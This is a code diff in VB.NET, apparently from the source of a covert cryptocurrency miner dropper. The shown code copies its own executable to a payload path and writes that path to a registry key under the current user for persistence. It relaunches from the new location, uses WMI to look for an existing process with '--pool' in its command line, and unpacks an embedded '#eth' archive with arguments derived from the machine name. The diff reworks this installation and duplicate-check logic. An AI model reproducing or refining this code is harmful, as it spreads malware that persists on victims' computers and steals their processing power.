@@ -44,9 +44,6 @@ Public Class Program
         Registry.CurrentUser.CreateSubKey(GetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath)
         Install()
 #End If
-#If INS And Not WD Then
-        Process.Start(PayloadPath)
-#End If
         Initialize()
     End Sub
 
@@ -65,6 +62,7 @@ Public Class Program
                 System.IO.File.WriteAllBytes(PayloadPath, System.IO.File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName))
                 Thread.Sleep(2 * 1000)
                 BaseFolder()
+                Process.Start(PayloadPath)
                 Environment.Exit(0)
             End If
         Catch ex As Exception
@@ -112,7 +110,7 @@ Public Class Program
         End Try
     End Sub
 
-    Public Shared Function KillLastProc()
+    Public Shared Function CheckProc()
         On Error Resume Next
         Dim options As ConnectionOptions = New ConnectionOptions()
         options.Impersonation = ImpersonationLevel.Impersonate
@@ -126,7 +124,6 @@ Public Class Program
 
         For Each retObject As ManagementObject In managementObjectCollection
             If retObject("CommandLine").ToString().Contains("--pool") Then
-                Environment.Exit(0)
                 Return True
             End If
         Next
@@ -144,9 +141,13 @@ Public Class Program
             BaseFolder()
 
             Dim argstr As String = GetString("#ARGSTR") + rS
-            argstr = Replace(argstr, "{%RANDOM%}", Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
-            argstr = Replace(argstr, "{%COMPUTERNAME%}", RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10))
-            KillLastProc()
+            argstr = Replace(argstr, "{%RANDOM%}", "R" & Guid.NewGuid.ToString().Replace("-", "").Substring(0, 10))
+            argstr = Replace(argstr, "{%COMPUTERNAME%}", "C" & RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", "").Substring(0, 10))
+
+            If CheckProc() Then
+                Environment.Exit(0)
+            End If
+
             Try
                 Using archive As ZipArchive = New ZipArchive(New MemoryStream(GetTheResource("#eth")))
                     For Each entry As ZipArchiveEntry In archive.Entries
